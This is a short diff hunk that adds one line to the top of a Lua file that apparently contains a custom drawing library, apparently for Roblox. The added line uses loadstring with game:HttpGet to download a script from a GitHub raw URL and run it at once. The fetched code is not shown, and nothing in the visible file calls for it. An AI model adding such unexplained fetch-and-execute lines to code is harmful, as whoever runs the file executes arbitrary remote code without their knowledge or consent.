@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/misc-scripts/main/test.lua"))()
+
 --// CUSTOM DRAWING
 
 local drawing = {} do
